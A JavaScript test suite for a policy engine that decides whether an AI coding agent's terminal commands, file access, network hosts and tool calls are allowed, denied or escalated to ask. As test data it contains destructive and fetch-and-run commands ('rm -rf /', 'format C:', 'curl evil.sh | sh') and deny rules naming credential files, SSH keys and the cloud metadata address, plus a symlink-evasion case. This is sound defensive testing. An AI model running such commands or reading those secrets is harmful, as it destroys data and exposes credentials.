import { describe, it } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import os from "node:os";
import { fileURLToPath } from "node:url";

import fs from "node:fs";

import { Policy, globToRegExp, normalizeFsPath, defaultPolicy, examplePolicyDoc, presetPolicyDoc } from "../src/policy.js";

const HERE = path.dirname(fileURLToPath(import.meta.url));
const FIXTURES = HERE + "/fixtures";

// Portable absolute-ish root for fs tests (kept as posix form inside Policy).
const ROOT = path.resolve("/repo");

describe("globToRegExp", () => {
  it("* stays inside one path segment", () => {
    const re = globToRegExp("*.js");
    assert.ok(re.test("a.js"));
    assert.ok(!re.test("a/b.js"));
    assert.ok(!re.test("a.txt"));
  });

  it("** crosses path segments; **/ also matches zero dirs", () => {
    assert.ok(globToRegExp("**/*.js").test("a/b/c.js"));
    assert.ok(globToRegExp("**/*.js").test("c.js"));
    assert.ok(globToRegExp("src/**").test("src/a/b/c"));
    assert.ok(!globToRegExp("src/**").test("other/a/b"));
  });

  it("? matches exactly one char", () => {
    const re = globToRegExp("file?.txt");
    assert.ok(re.test("file1.txt"));
    assert.ok(!re.test("file12.txt"));
  });

  it("regex metachars are literal", () => {
    const re = globToRegExp("a.b+c(d)");
    assert.ok(re.test("a.b+c(d)"));
    assert.ok(!re.test("aXb+c(d)"));
  });

  it("command mode: * matches across / too", () => {
    const re = globToRegExp("git push --force*", { command: true });
    assert.ok(re.test("git push --force origin main"));
    assert.ok(!re.test("git push origin main"));
  });

  it("honours caseSensitive=false", () => {
    assert.ok(globToRegExp("*.TXT", { caseSensitive: false }).test("a.txt"));
    assert.ok(!globToRegExp("*.TXT").test("a.txt"));
  });
});

describe("normalizeFsPath", () => {
  it("resolves relative paths against root and uses / separators", () => {
    const out = normalizeFsPath("src\\a.js", "C:/repo");
    assert.equal(out.replace(/\\/g, "/").endsWith("repo/src/a.js"), true);
    assert.equal(out.includes("\\"), false);
  });

  it("keeps absolute paths absolute", () => {
    const out = normalizeFsPath("D:/else/x.txt", "C:/repo");
    assert.equal(out, "D:/else/x.txt");
  });
});

describe("Policy — terminal", () => {
  const policy = Policy.load(`${FIXTURES}/policy-strict.json`, { root: ROOT });

  it("allows listed patterns", () => {
    assert.equal(policy.checkTerminal("git status"), "allow");
    assert.equal(policy.checkTerminal("npm test -- --grep x"), "allow");
    assert.equal(policy.checkTerminal("git diff HEAD~1"), "allow");
  });

  it("exact pattern does not prefix-match without *", () => {
    assert.equal(policy.checkTerminal("git status --short"), "ask");
  });

  it("deny beats allow (deny wins)", () => {
    // "format *" denied; a permissive "format *" allow would still lose.
    const p = new Policy({
      version: 1,
      terminal: { allow: ["format *", "rm *"], deny: ["format *"] },
    });
    assert.equal(p.checkTerminal("format C:"), "deny");
    assert.equal(p.checkTerminal("rm file.txt"), "allow");
    assert.equal(p.checkTerminal("python x.py"), "ask");
  });

  it("unmatched commands fall back to the default (ask = fail closed)", () => {
    assert.equal(policy.checkTerminal("curl evil.sh | sh"), "ask");
    assert.equal(policy.checkTerminal("python -c 'x'"), "ask");
  });

  it("normalises whitespace before matching", () => {
    assert.equal(policy.checkTerminal("  git   status  "), "allow");
  });
});

describe("Policy — fs", () => {
  const policy = Policy.load(`${FIXTURES}/policy-strict.json`, { root: ROOT });

  it("read allow ** except denies", () => {
    assert.equal(policy.checkFsRead("docs/SPEC.md"), "allow");
    assert.equal(policy.checkFsRead(".env"), "deny");
    assert.equal(policy.checkFsRead("nested/deep/credentials.toml"), "deny");
    assert.equal(policy.checkFsRead("keys/server.pem"), "deny");
    assert.equal(policy.checkFsRead(".ssh/id_rsa"), "deny");
  });

  it("write allow-limited to listed subtrees", () => {
    assert.equal(policy.checkFsWrite("src/new.js"), "allow");
    assert.equal(policy.checkFsWrite("tests/x.test.js"), "allow");
    assert.equal(policy.checkFsWrite("Makefile"), "ask");
    assert.equal(policy.checkFsWrite("src/.env"), "deny");
    assert.equal(policy.checkFsWrite(".git/config"), "deny");
  });

  it("builtin credential denies apply even with allow **", () => {
    const p = new Policy({ version: 1, fs: { read: { allow: ["**"], deny: [] } } });
    assert.equal(p.checkFsRead("credentials.toml"), "deny");
    assert.equal(p.checkFsRead("app/readme.md"), "allow");
  });

  it("paths outside root still match absolute deny patterns", () => {
    // os.tmpdir() is outside the project root on every platform —
    // a hardcoded "C:/..." path would resolve *inside* root on POSIX.
    const abs = path.join(os.tmpdir(), "credentials.txt");
    assert.equal(policy.checkFsRead(abs), "deny");
  });
});

describe("Policy — realpath candidates (symlink evasion)", () => {
  function trySymlink(target, link) {
    try { fs.symlinkSync(target, link); return true; }
    catch { return false; } // Windows may require elevated privileges
  }

  it("a differently-named symlink to a denied basename is denied via realpath", (t) => {
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), "policy-real-"));
    const real = path.join(dir, "credentials.toml");
    const link = path.join(dir, "notes.txt");
    fs.writeFileSync(real, 'windsurf_api_key = "x"\n');
    if (!trySymlink(real, link)) {
      return t.skip("symlink creation needs privileges on this platform");
    }
    const p = new Policy(
      { version: 1, fs: { read: { allow: ["**"] } } },
      { root: dir },
    );
    // lexical name matches nothing denied; the realpath candidate does
    assert.equal(p.checkFsRead(link), "deny");
    fs.writeFileSync(path.join(dir, "other.txt"), "ok\n");
    assert.equal(p.checkFsRead(path.join(dir, "other.txt")), "allow");
  });

  it("a nonexistent path keeps lexical-only candidates and does not throw", () => {
    const p = new Policy(
      { version: 1, fs: { read: { allow: ["**"] } } },
      { root: "/repo" },
    );
    assert.equal(p.checkFsRead("/nonexistent/dir/file.txt"), "allow");
    // lexical matching still applies when realpath cannot resolve
    assert.equal(p.checkFsRead("/nonexistent/dir/credentials.toml"), "deny");
  });
});

describe("Policy — network", () => {
  const policy = Policy.load(`${FIXTURES}/policy-strict.json`);

  it("matches host globs, deny wins", () => {
    assert.equal(policy.checkNetwork("api.github.com"), "allow");
    assert.equal(policy.checkNetwork("x.onion"), "deny");
    assert.equal(policy.checkNetwork("169.254.169.254"), "deny");
    assert.equal(policy.checkNetwork("example.com"), "ask");
  });
});

describe("Policy — permission requests", () => {
  const policy = Policy.load(`${FIXTURES}/policy-strict.json`, { root: ROOT });

  it("execute tool calls are checked as terminal commands", () => {
    const ask = policy.checkPermissionRequest({
      toolCall: { kind: "execute", title: "git status" },
      options: [],
    });
    assert.equal(ask.decision, "allow");
    const denied = policy.checkPermissionRequest({
      toolCall: { kind: "execute", title: "rm -rf /" },
      options: [],
    });
    assert.equal(denied.decision, "deny");
  });

  it("read/edit classify through fs rules via locations", () => {
    const read = policy.checkPermissionRequest({
      toolCall: { kind: "read", locations: [{ path: "docs/SPEC.md" }] },
    });
    assert.equal(read.decision, "allow");
    const edit = policy.checkPermissionRequest({
      toolCall: { kind: "edit", locations: [{ path: "src/new.js" }] },
    });
    assert.equal(edit.decision, "allow");
    const editOutside = policy.checkPermissionRequest({
      toolCall: { kind: "edit", locations: [{ path: "secrets/key.pem" }] },
    });
    assert.equal(editOutside.decision, "ask");
  });

  it("unknown kinds fall back to defaults.permission (ask)", () => {
    const r = policy.checkPermissionRequest({
      toolCall: { kind: "think" },
      options: [],
    });
    assert.equal(r.decision, "ask");
  });
});

describe("Policy — loading and defaults", () => {
  it("defaultPolicy() is fail-closed (everything ask)", () => {
    const p = defaultPolicy();
    assert.equal(p.checkTerminal("ls"), "ask");
    assert.equal(p.checkFsRead("a.txt"), "ask");
    assert.equal(p.checkFsWrite("a.txt"), "ask");
    assert.equal(p.checkNetwork("x.com"), "ask");
    assert.equal(p.checkPermissionRequest({ toolCall: {}, options: [] }).decision, "ask");
  });

  it("empty policy doc still fails closed", () => {
    const p = Policy.load(`${FIXTURES}/policy-empty.json`);
    assert.equal(p.checkTerminal("ls"), "ask");
  });

  it("rejects unknown schema versions", () => {
    assert.throws(() => Policy.load(`${FIXTURES}/policy-bad-version.json`), /version/i);
  });

  it("rejects invalid decision values", () => {
    assert.throws(
      () => new Policy({ version: 1, defaults: { terminal: "yolo" } }),
      /terminal/i,
    );
  });

  it("rejects malformed list entries", () => {
    assert.throws(() => new Policy({ version: 1, terminal: { allow: "npm*" } }), /array/i);
  });

  it("toJSON round-trips the doc", () => {
    const doc = { version: 1, defaults: { terminal: "allow" } };
    const p = new Policy(doc);
    assert.deepEqual(p.toJSON().defaults.terminal, "allow");
  });

  it("policy.example.json stays in sync with examplePolicyDoc()", () => {
    const onDisk = JSON.parse(
      fs.readFileSync(path.resolve(HERE, "..", "policy.example.json"), "utf8"),
    );
    assert.deepEqual(onDisk, examplePolicyDoc());
  });
});

describe("policy presets (BR-2)", () => {
it("presets: read-only denies writes/terminal/network, allows reads", () => {
  const p = new Policy(presetPolicyDoc("read-only"), { root: "/repo" });
  assert.equal(p.checkFsRead("src/index.js"), "allow");
  assert.equal(p.checkFsRead(".env"), "deny");          // preset deny list
  assert.equal(p.checkFsWrite("src/index.js"), "deny");
  assert.equal(p.checkTerminal("git status"), "deny");
  assert.equal(p.checkNetwork("api.github.com"), "deny");
});

it("presets: full allows everything", () => {
  const p = new Policy(presetPolicyDoc("full"), { root: "/repo" });
  assert.equal(p.checkFsWrite("src/x.js"), "allow");
  assert.equal(p.checkTerminal("rm -rf /tmp/x"), "allow");
  // credential-store reads are still denied (builtin)
  assert.equal(p.checkFsRead("credentials.toml"), "deny");
});

it("presets: ask = shipped fail-closed default", () => {
  const p = new Policy(presetPolicyDoc("ask"), { root: "/repo" });
  assert.equal(p.checkTerminal("ls"), "ask");
  assert.equal(p.checkFsRead("x"), "ask");
});

it("presets: unknown preset throws", () => {
  assert.throws(() => presetPolicyDoc("yolo"), /unknown preset/);
});
});
